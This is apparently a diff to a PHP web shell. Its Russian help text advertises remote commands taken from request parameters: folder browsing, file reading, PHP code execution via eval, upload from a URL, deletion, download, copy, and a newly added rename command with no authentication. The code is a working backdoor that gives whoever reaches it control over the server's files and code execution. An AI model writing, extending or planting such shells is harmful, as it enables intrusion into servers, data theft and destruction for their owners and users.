@@ -85,7 +85,13 @@ if(!@copy($settings[0], $settings[1]))
 }
 }
 
+if(isset($_REQUEST['rename'])){ 
+$settings = explode(' renameas ', $_REQUEST['rename']);
+rename($settings[0], $settings[1]); 
+echo "<pre>"; echo "файл переименован: " . $settings[1];
+
+}
 
 if(isset($_REQUEST['h'])){ 
-echo "<pre>"; echo "Короче. \n\n dir - путешествие по папкам \n read - чтение файлов \n eval - выполнение PHP кода \n upload - загрузка файлов по ссылке в __DIR__  \n del - удаление файлов \n download - скачивание файла с сервера \n stat - информация о файле (вес, последний доступ, кода модифицировано и сколько ссылок)";
+echo "<pre>"; echo "Короче. \n\n dir - путешествие по папкам \n read - чтение файлов \n eval - выполнение PHP кода \n upload - загрузка файлов по ссылке в __DIR__  \n del - удаление файлов \n download - скачивание файла с сервера \n stat - информация о файле (вес, последний доступ, кода модифицировано и сколько ссылок) \n copy - копирование, разделитель copyas \n rename - переименовывание, разделитель renameas";
 }
